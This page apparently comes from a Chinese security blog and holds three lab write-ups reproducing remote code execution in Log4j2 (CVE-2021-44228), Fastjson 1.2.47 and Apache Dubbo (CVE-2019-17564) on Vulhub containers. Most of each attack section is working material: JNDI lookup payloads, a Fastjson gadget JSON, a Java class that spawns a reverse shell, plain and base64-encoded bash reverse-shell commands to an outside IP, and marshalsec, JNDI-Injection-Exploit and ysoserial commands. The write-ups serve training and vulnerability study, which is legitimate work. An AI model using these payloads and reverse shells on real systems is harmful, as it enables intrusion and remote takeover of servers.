<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="Su." type="application/atom+xml" />






<meta name="description" content="有些事情想着想着就错过了，做着做着就成功了">
<meta property="og:type" content="website">
<meta property="og:title" content="Su.">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Su.">
<meta property="og:description" content="有些事情想着想着就错过了，做着做着就成功了">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Su.">
<meta name="twitter:description" content="有些事情想着想着就错过了，做着做着就成功了">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/"/>





  <title>Su.</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>
	<a href="https://github.com/suyiyang123/suyiyang123.github.io.git"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_gray_6d6d6d.png" alt="Fork me on GitHub"></a>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Su.</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-something">
          <a href="/something" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            something
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2023/09/10/Apache Log4j2 lookup JNDI 注入漏洞 CVE-2021-44228/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="biobby">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Su.">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2023/09/10/Apache Log4j2 lookup JNDI 注入漏洞 CVE-2021-44228/" itemprop="url">Apache Log4j2 lookup JNDI 注入漏洞 CVE-2021-44228</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2023-09-10T21:00:50+08:00">
                2023-09-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/漏洞复现/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞复现</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          
		  
		  

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Apache-Log4j2-lookup-JNDI-注入漏洞-CVE-2021-44228"><a href="#Apache-Log4j2-lookup-JNDI-注入漏洞-CVE-2021-44228" class="headerlink" title="Apache Log4j2 lookup JNDI 注入漏洞 CVE-2021-44228"></a>Apache Log4j2 lookup JNDI 注入漏洞 CVE-2021-44228</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Log4j 2 是Java语言的日志处理套件，使用极为广泛。在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于<code>${jndi:ldap://evil.com/example}</code>的lookup用于进行JNDI注入，执行任意代码。</p>
<blockquote>
<p><strong>Apache Log4j2</strong> 是一个 Java 的日志管理工具，是 Log4j 的升级版本</p>
</blockquote>
<blockquote>
<p><strong>JNDI</strong>（Java Naming and Directory Interface）是 Java 平台提供的一种命名和目录服务接口，用于在 Java 应用程序中访问各种命名和目录服务，如 DNS、LDAP、RMI 注册表等。JNDI 提供了统一的方式来访问这些服务，使得 Java 应用程序能够更方便地与外部资源进行交互。</p>
<p><strong>JNDI 注入漏洞</strong>是指攻击者通过恶意构造的输入参数，绕过应用程序的安全机制，将攻击者控制的恶意对象注入到 JNDI 上下文中，从而导致应用程序在使用 JNDI 服务时执行恶意操作或获取敏感信息。</p>
<p>JNDI 注入漏洞通常出现在使用 JNDI 进行资源查找和连接时，攻击者通过在输入参数中插入特定的 JNDI URL 或其他恶意信息，来欺骗应用程序使用攻击者指定的资源。具体攻击方式可能因应用程序的不同而有所差异。</p>
</blockquote>
<blockquote>
<p>在 JNDI（Java Naming and Directory Interface）中，<strong>lookup</strong> 是指通过名称查找资源、对象或上下文。</p>
<p>JNDI 提供了一种机制，使得我们可以通过名称来访问和获取各种命名和目录服务中的资源。<strong>lookup 操作</strong>是 JNDI 中的一项基本操作，通过指定一个唯一的名称或路径，我们可以在 JNDI 上下文中查找并获取与该名称相关联的资源。</p>
<p>lookup 操作的具体步骤如下：</p>
<ol>
<li>获取 JNDI 初始上下文（Initial Context）：通常使用 <code>InitialContext</code> 类的实例来表示。</li>
<li>调用 <code>lookup()</code> 方法：使用 JNDI 上下文的 <code>lookup()</code> 方法来执行查找操作。该方法接收一个名称参数，指定要查找的资源或对象的名称。</li>
<li>处理查找结果：<code>lookup()</code> 方法返回一个对象，表示与给定名称相关联的资源，根据具体情况进行处理。如果找到匹配的资源，我们可以将其类型转换为我们所需的类型，并使用该资源进行后续操作。</li>
</ol>
</blockquote>
<p>参考链接：</p>
<ul>
<li><a href="https://logging.apache.org/log4j/2.x/security.html" target="_blank" rel="noopener">https://logging.apache.org/log4j/2.x/security.html</a></li>
<li><a href="https://www.lunasec.io/docs/blog/log4j-zero-day/" target="_blank" rel="noopener">https://www.lunasec.io/docs/blog/log4j-zero-day/</a></li>
<li><a href="https://xz.aliyun.com/t/10649" target="_blank" rel="noopener">https://xz.aliyun.com/t/10649</a></li>
</ul>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Apache Log4j2 不是一个特定的Web服务，而仅仅是一个第三方库，我们可以通过找到一些使用了这个库的应用来复现这个漏洞，比如Apache Solr。</p>
<p>Vulhub执行如下命令启动一个Apache Solr 8.11.0，其依赖了Log4j 2.14.1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
<p>服务启动后，访问<code>http://your-ip:8983</code>即可查看到Apache Solr的后台页面。</p>
<ul>
<li>Apache Solr 是一个基于 Apache Lucene 的开源搜索平台，主要用于构建强大的全文搜索、分布式搜索和数据分析应用。</li>
</ul>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><code>${jndi:ldap://${sys:java.version}.example.com}</code>是利用JNDI发送DNS请求的Payload，我们将其作为管理员接口的action参数值，发送如下数据包：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.example.com&#125; HTTP/1.1</span><br><span class="line">Host: your-ip:8983</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910210522752.png" alt="image-20230910210522752"></p>
<p>我们可以在DNS日志平台收到相关日志，显示出当前Java版本：</p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910210642364.png" alt="image-20230910210642364"></p>
<p>实际利用JNDI注入漏洞，可以使用<a href="https://github.com/welk1n/JNDI-Injection-Exploit" target="_blank" rel="noopener">这个工具</a>。</p>
<p>若利用工具，要确保 <strong>1099</strong>、<strong>1389</strong>、<strong>8180</strong>端口可用，不被其他程序占用。</p>
<p>需要把生成的 JNDI链接注入到存在漏洞的应用环境中</p>
<p><a href="https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md" target="_blank" rel="noopener">https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md</a></p>
<p>得到工具jar包</p>
<ul>
<li><p>把源码下载到本地然后自行编译打包。（在Java1.7+ 、Java1.8+ 和 Maven 3.x+环境下测试可以）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/welk1n/JNDI-Injection-Exploit.git</span><br><span class="line">$ cd JNDI-Injection-Exploit</span><br><span class="line">$ mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910214122074.png" alt="image-20230910214122074"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar /root/vulhub-tools/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</span><br><span class="line">-C &quot;touch /tmp/awesoe_oc&quot; -A &quot;123.56.181.14&quot;</span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910215040184.png" alt="image-20230910215040184"></p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910214233218.png" alt="image-20230910214233218"></p>
<p>利用完毕后，可见<code>touch /tmp/awesome_oc</code>已经成功被执行：</p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910213939887.png" alt="image-20230910213939887"></p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>若出现端口已被占用问题，可逐一检查<strong>1099</strong>、<strong>1389</strong>、<strong>8180</strong>端口，杀死相关占用进程</p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910214508372.png" alt="image-20230910214508372"></p>
<p>  构造反弹shell命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/123.56.181.14/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar /root/vulhub-tools/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTYuMTgxLjE0LzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;123.56.181.14&quot;</span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910214650226.png" alt="image-20230910214650226"></p>
<p>  <img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910214740245.png" alt="image-20230910214740245"></p>
<p>攻击机监听4444端口，上述请求包发送后，接收反弹shell：</p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910214913343.png" alt="image-20230910214913343"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2023/09/05/Fastjson 1.2.47 远程命令执行漏洞/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="biobby">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Su.">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2023/09/05/Fastjson 1.2.47 远程命令执行漏洞/" itemprop="url">Fastjson 1.2.47 远程命令执行漏洞</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2023-09-05T16:00:50+08:00">
                2023-09-05
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/漏洞复现/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞复现</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          
		  
		  

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Fastjson-1-2-47-远程命令执行漏洞"><a href="#Fastjson-1-2-47-远程命令执行漏洞" class="headerlink" title="Fastjson 1.2.47 远程命令执行漏洞"></a>Fastjson 1.2.47 远程命令执行漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955" target="_blank" rel="noopener">https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955</a></li>
<li><a href="https://www.freebuf.com/vuls/208339.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/208339.html</a></li>
</ul>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Vulhub执行如下命令启动一个spring web项目，其中使用fastjson作为默认json解析器：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/fastjson/1.2.47-rce/</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
<p>环境启动后，访问<code>http://your-ip:8090</code>即可看到一个json对象被返回，我们将content-type修改为<code>application/json</code>后可向其POST新的JSON对象，后端会利用fastjson进行解析。</p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905203858855.png" alt="image-20230905203858855" style="zoom:50%;"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>目标环境是<code>openjdk:8u102</code>，这个版本没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以简单利用RMI进行命令执行。</p>
<p>首先编译并上传命令执行代码，如<code>http://123.56.181.14:8888/TouchFile.class</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// javac TouchFile.java</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;&quot;bash&quot;, &quot;-c&quot;,&quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTYuMTgxLjE0LzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String[] commands = &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.174.128/9999;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;;</span><br></pre></td></tr></table></figure>
<p>然后我们借助<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://123.56.181.14:8888/#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure>
<p>向靶场服务器发送Payload（此处的Payload和Fastjson 1.2.24不同）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://123.56.181.14:9999/TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905205607237.png" alt="image-20230905205607237"></p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905205623200.png" alt="image-20230905205623200"></p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905205714157.png" alt="image-20230905205714157"></p>
<p>监听4444端口，接收反弹shell：</p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905210217935.png" alt="image-20230905210217935"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2023/09/05/Aapche Dubbo Java反序列化漏洞（CVE-2019-17564）/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="biobby">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Su.">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2023/09/05/Aapche Dubbo Java反序列化漏洞（CVE-2019-17564）/" itemprop="url">Aapche Dubbo Java反序列化漏洞（CVE-2019-17564）</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2023-09-05T14:00:50+08:00">
                2023-09-05
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/漏洞复现/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞复现</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          
		  
		  

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Aapche-Dubbo-Java反序列化漏洞（CVE-2019-17564）"><a href="#Aapche-Dubbo-Java反序列化漏洞（CVE-2019-17564）" class="headerlink" title="Aapche Dubbo Java反序列化漏洞（CVE-2019-17564）"></a>Aapche Dubbo Java反序列化漏洞（CVE-2019-17564）</h1><p>Apache Dubbo是一款高性能、轻量级的开源Java RPC服务框架。RPC，全称为Remote Procedure Call，即远程过程调用，它是一个计算机通信协议。它允许像调用本地服务一样调用远程服务。</p>
<p>Dubbo可以使用不同协议通信，当使用http协议时，Apache Dubbo直接使用了Spring框架的<code>org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter</code>类做远程调用，而这个过程会读取POST请求的Body并进行反序列化，最终导致漏洞。</p>
<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Dubbo 2.7.4及以前版本</span><br></pre></td></tr></table></figure>
<p>Apache Dubbo 2.7.5后Dubbo使用<code>com.googlecode.jsonrpc4j.JsonRpcServer</code>替换了<code>HttpInvokerServiceExporter</code>。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>执行如下命令启动一个Apache Dubbo 2.7.3 Provider：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/dubbo/CVE-2019-17564/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>服务启动后，访问<code>http://your-ip:8080</code>，服务器默认会返回500错误。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>利用该漏洞需要先知道目标RPC接口名，而Dubbo所有的RPC配置储存在registry中，通常使用Zookeeper作为registry。如果能刚好找到目标的Zookeeper未授权访问漏洞，那么就可以在其中找到接口的名称与地址。</p>
<p>Vulhub对外开放了8080端口和2181端口，其中2181即为Zookeeper的端口，本地下载<a href="https://zookeeper.apache.org/" target="_blank" rel="noopener">Zookeeper</a>，使用其中自带的<strong>zkCli</strong>即可连接到这台Zookeeper服务器。</p>
<p>依次执行以下命令下载、解压、使用zkCli工具：</p>
<blockquote>
<p>记得把2181加入安全组，所有ip都能访问</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://dlcdn.apache.org/zookeeper/zookeeper-3.7.1/apache-zookeeper-3.7.1-bin.tar.gz --no-check-certificate</span><br><span class="line">或者</span><br><span class="line">wget https://archive.apache.org/dist/zookeeper/zookeeper-3.7.0/apache-zookeeper-3.7.0-bin.tar.gz</span><br><span class="line">$ tar xvf apache-zookeeper-3.7.0-bin.tar.gz</span><br><span class="line">$ cd apache-zookeeper-3.7.0-bin/bin</span><br><span class="line">$ ./zkCli.sh -server target-ip:2181</span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905150644982.png" alt="image-20230905150644982"></p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905150745040.png" alt="image-20230905150745040"></p>
<p>连接后进入一个交互式控制台，使用<code>ls</code>即可列出其中所有节点，包括Dubbo相关的配置：</p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905153725509.png" alt="image-20230905153725509"></p>
<p>获取到RPC接口名为<code>org.vulhub.api.CalcService</code>。直接用ysoserial生成CommonsCollections6的Payload作为POST Body发送到<code>http://your-ip:8080/org.vulhub.api.CalcService</code>即可触发反序列化漏洞：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar ysoserial-master-2874a69f61-1.jar CommonsCollections6 &quot;touch /tmp/awesome_poc&quot; &gt; 1.poc</span><br><span class="line"></span><br><span class="line">$ curl -XPOST --data-binary @1.poc http://123.56.181.14:8080/org.vulhub.api.CalcService</span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905154734165.png" alt="image-20230905154734165"></p>
